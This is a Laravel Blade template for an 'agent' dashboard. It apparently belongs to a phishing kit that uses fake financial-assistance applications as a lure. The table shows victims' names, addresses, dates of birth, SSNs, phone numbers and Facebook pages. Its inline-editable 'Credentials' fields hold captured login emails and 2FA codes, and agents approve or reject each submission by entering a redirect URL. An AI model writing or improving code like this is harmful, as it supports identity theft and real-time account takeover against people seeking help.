@extends('layouts.agent')

@section('title', 'My Submissions')

@push('styles')
<style>
    /* Prevent date picker from opening when interacting with other fields */
    body[data-other-field-focused="true"] input[type="date"] {
        pointer-events: none !important;
    }
    
    /* When typing in other fields, close any open date pickers */
    input[type="text"],
    input[type="email"],
    input[type="url"],
    select,
    textarea {
        position: relative;
        z-index: 10;
    }
    
    /* Ensure date inputs don't interfere */
    input[type="date"] {
        position: relative;
        z-index: 1;
    }
</style>
@endpush

@section('content')
<div class="card card-soft">
    <div class="card-body">
        <div class="d-flex justify-content-between flex-wrap gap-2 mb-3">
            <h5 class="mb-0">User Records</h5>
        </div>

        <form class="row g-3 mb-3" method="GET" action="{{ route('agent.report') }}">
            <div class="col-md-3">
                <label class="form-label">Search (name/email/phone)</label>
                <input type="text" name="search" value="{{ $filters['search'] ?? '' }}" class="form-control" placeholder="Search...">
            </div>
            <div class="col-md-2">
                <label class="form-label">Date From</label>
                <input type="date" name="date_from" value="{{ $filters['date_from'] ?? '' }}" class="form-control">
            </div>
            <div class="col-md-2">
                <label class="form-label">Date To</label>
                <input type="date" name="date_to" value="{{ $filters['date_to'] ?? '' }}" class="form-control">
            </div>
            <div class="col-md-3">
                <label class="form-label">Assistance Type</label>
                <select name="assistance_type" class="form-control">
                    <option value="">All types</option>
                    @foreach (['Housing Expenses', 'Utility Bills', 'Education Fees', 'Medical Expenses', 'Food & Essentials', 'Other'] as $type)
                        <option value="{{ $type }}" @selected(($filters['assistance_type'] ?? '') === $type)>{{ $type }}</option>
                    @endforeach
                </select>
            </div>
            <div class="col-md-2 d-flex align-items-end">
                <button class="btn btn-outline-primary w-100" type="submit">Filter</button>
            </div>
        </form>

        <div class="table-responsive">
            <table class="table table-striped align-middle">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Source</th>
                        <th>Name</th>
                        <th>Address</th>
                        <th>DOB</th>
                        <th>SSN</th>
                        <th>Mobile</th>
                        <th>Credentials</th>
                    </tr>
                </thead>
                <tbody>
                    @forelse ($submissions as $submission)
                        <tr data-submission-id="{{ $submission->id }}">
                            <td>{{ $submission->id }}</td>
                            <td>
                                <div class="small">
                                    <div><strong>{{ $submission->email }}</strong></div>
                                    <div>{{ $submission->facebookUser ? $submission->facebookUser->full_name . ' Pages' : 'No Page' }}</div>
                                    <div>{{ $submission->first_name }} {{ $submission->last_name }}</div>
                                    <div>{{ $submission->submittedBy ? $submission->submittedBy->name : 'Public' }}</div>
                                    <div class="text-muted">{{ $submission->created_at->format('h:i A - j M Y') }}</div>
                                </div>
                            </td>
                            <td>{{ $submission->first_name }} {{ $submission->last_name }}</td>
                            <td>
                                @if($submission->street || $submission->city || $submission->state || $submission->zip)
                                    <div class="small">
                                        @if($submission->street)<div>{{ $submission->street }},</div>@endif
                                        @if($submission->city || $submission->state || $submission->zip)
                                            <div>{{ $submission->city }}{{ $submission->city && ($submission->state || $submission->zip) ? ',' : '' }} {{ $submission->state }} {{ $submission->zip }}</div>
                                        @endif
                                    </div>
                                @else
                                    -
                                @endif
                            </td>
                            <td>{{ $submission->dob ? $submission->dob->format('m/d/Y') : '-' }}</td>
                            <td>{{ $submission->ssn ? $submission->ssn : '-' }}</td>
                            <td>{{ $submission->phone ? $submission->phone : '-' }}</td>
                            <td>
                                <div class="credentials-column" style="min-width: 200px;">
                                    <div class="mb-2">
                                        <label class="small text-muted">Email:</label>
                                        <input type="email" 
                                               class="form-control form-control-sm credentials-email" 
                                               value="{{ $submission->credentials_email ?? '' }}" 
                                               placeholder="Email"
                                               data-field="credentials_email"
                                               data-submission-id="{{ $submission->id }}">
                                    </div>
                                    <div class="mb-2">
                                        <label class="small text-muted">2FA:</label>
                                        <input type="text" 
                                               class="form-control form-control-sm credentials-2fa" 
                                               value="{{ $submission->credentials_2fa ?? '' }}" 
                                               placeholder="2FA"
                                               data-field="credentials_2fa"
                                               data-submission-id="{{ $submission->id }}">
                                    </div>
                                    <div class="mb-2">
                                        <label class="small text-muted">DL:</label>
                                        <input type="url" 
                                               class="form-control form-control-sm credentials-dl" 
                                               value="{{ $submission->approved_url ?? '' }}" 
                                               placeholder="Redirect URL"
                                               data-field="approved_url"
                                               data-submission-id="{{ $submission->id }}">
                                    </div>
                                    <div class="mt-2">
                                        @if($submission->status === 'approved')
                                            <span class="badge bg-success">Approved</span>
                                        @elseif($submission->status === 'incorrect')
                                            <span class="badge bg-danger">Invalid</span>
                                        @else
                                            <div class="d-flex gap-1">
                                                <button type="button" 
                                                        class="btn btn-sm btn-danger btn-invalid" 
                                                        data-submission-id="{{ $submission->id }}"
                                                        title="Mark as Invalid">
                                                    Invalid
                                                </button>
                                                <button type="button" 
                                                        class="btn btn-sm btn-success btn-approve" 
                                                        data-submission-id="{{ $submission->id }}"
                                                        title="Approve">
                                                    Approve
                                                </button>
                                            </div>
                                        @endif
                                    </div>
                                </div>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="8" class="text-center text-muted py-4">No submissions found.</td>
                        </tr>
                    @endforelse
                </tbody>
            </table>
        </div>

        <div class="mt-3">
            {{ $submissions->links() }}
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Prevent date picker from opening when typing in other fields
    const dateInputs = document.querySelectorAll('input[type="date"]');
    const otherInputs = document.querySelectorAll('input:not([type="date"]), select, textarea');
    
    // When user interacts with non-date fields, close date pickers
    otherInputs.forEach(input => {
        // On focus, close any open date pickers
        input.addEventListener('focus', function() {
            document.body.setAttribute('data-other-field-focused', 'true');
            dateInputs.forEach(dateInput => {
                if (document.activeElement === dateInput) {
                    dateInput.blur();
                }
                dateInput.style.pointerEvents = 'none';
            });
        });
        
        // On mousedown (before focus), close date pickers
        input.addEventListener('mousedown', function() {
            document.body.setAttribute('data-other-field-focused', 'true');
            dateInputs.forEach(dateInput => {
                if (document.activeElement === dateInput) {
                    dateInput.blur();
                }
                dateInput.style.pointerEvents = 'none';
            });
        });
        
        // On click, close date pickers
        input.addEventListener('click', function() {
            dateInputs.forEach(dateInput => {
                if (document.activeElement === dateInput) {
                    dateInput.blur();
                }
            });
        });
        
        // On blur, re-enable date inputs
        input.addEventListener('blur', function() {
            setTimeout(() => {
                document.body.removeAttribute('data-other-field-focused');
                dateInputs.forEach(dateInput => {
                    dateInput.style.pointerEvents = 'auto';
                });
            }, 100);
        });
    });
    
    // Global click handler to close date pickers when clicking elsewhere
    document.addEventListener('click', function(e) {
        const target = e.target;
        const isDateInput = target.type === 'date';
        const isOtherInput = (target.tagName === 'INPUT' && target.type !== 'date') || 
                            target.tagName === 'SELECT' || 
                            target.tagName === 'TEXTAREA' ||
                            target.tagName === 'BUTTON';
        
        if (isOtherInput && !isDateInput) {
            dateInputs.forEach(dateInput => {
                if (document.activeElement === dateInput) {
                    dateInput.blur();
                }
            });
        }
    }, true);
    
    // Handle inline editing for credentials
    const credentialInputs = document.querySelectorAll('.credentials-email, .credentials-2fa, .credentials-dl');
    
    credentialInputs.forEach(input => {
        let timeout;
        
        // Save on blur
        input.addEventListener('blur', function() {
            clearTimeout(timeout);
            saveCredential(this);
        });
        
        // Save on Enter key
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                clearTimeout(timeout);
                saveCredential(this);
                this.blur();
            }
        });
    });
    
    function saveCredential(input) {
        const submissionId = input.dataset.submissionId;
        const field = input.dataset.field;
        const value = input.value.trim();
        
        // Determine route based on current URL
        const isAgent = window.location.pathname.includes('/agent/');
        const route = isAgent 
            ? `/agent/submissions/${submissionId}/update-credentials`
            : `/submissions/${submissionId}/update-credentials`;
        
        fetch(route, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                [field]: value
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Optional: Show a small success indicator
                input.style.borderColor = '#28a745';
                setTimeout(() => {
                    input.style.borderColor = '';
                }, 1000);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            input.style.borderColor = '#dc3545';
            setTimeout(() => {
                input.style.borderColor = '';
            }, 2000);
        });
    }
    
    // Handle Invalid button clicks
    document.querySelectorAll('.btn-invalid').forEach(btn => {
        btn.addEventListener('click', function() {
            const submissionId = this.dataset.submissionId;
            updateStatus(submissionId, 'incorrect', this);
        });
    });
    
    // Handle Approve button clicks
    document.querySelectorAll('.btn-approve').forEach(btn => {
        btn.addEventListener('click', function() {
            const submissionId = this.dataset.submissionId;
            updateStatus(submissionId, 'approved', this);
        });
    });
    
    function updateStatus(submissionId, status, button) {
        const isAgent = window.location.pathname.includes('/agent/');
        const route = isAgent 
            ? `/agent/submissions/${submissionId}/incorrect`
            : `/submissions/${submissionId}/incorrect`;
        
        // For approve, we need a different route
        if (status === 'approved') {
            // Get the DL (redirect URL) value
            const dlInput = document.querySelector(`.credentials-dl[data-submission-id="${submissionId}"]`);
            const redirectUrl = dlInput ? dlInput.value.trim() : '';
            
            if (!redirectUrl) {
                alert('Please enter a redirect URL in the DL field before approving.');
                dlInput.focus();
                return;
            }
            
            const approveRoute = isAgent 
                ? `/agent/submissions/${submissionId}/approve-url`
                : `/submissions/${submissionId}/approve-url`;
            
            fetch(approveRoute, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    approved_url: redirectUrl
                })
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                }
                throw new Error('Network response was not ok');
            })
            .then(data => {
                if (data.success) {
                    button.classList.remove('btn-success');
                    button.classList.add('btn-secondary');
                    button.disabled = true;
                    button.textContent = 'Approved';
                    button.style.borderColor = '#28a745';
                    setTimeout(() => {
                        location.reload();
                    }, 500);
                } else {
                    alert('Error approving submission. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error approving submission. Please try again.');
            });
        } else {
            // Mark as incorrect
            fetch(route, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content,
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                }
                throw new Error('Network response was not ok');
            })
            .then(data => {
                if (data.success) {
                    button.classList.remove('btn-danger');
                    button.classList.add('btn-secondary');
                    button.disabled = true;
                    button.textContent = 'Invalid';
                    button.style.borderColor = '#dc3545';
                    setTimeout(() => {
                        location.reload();
                    }, 500);
                } else {
                    alert('Error marking as invalid. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error marking as invalid. Please try again.');
            });
        }
    }
});
</script>
@endsection
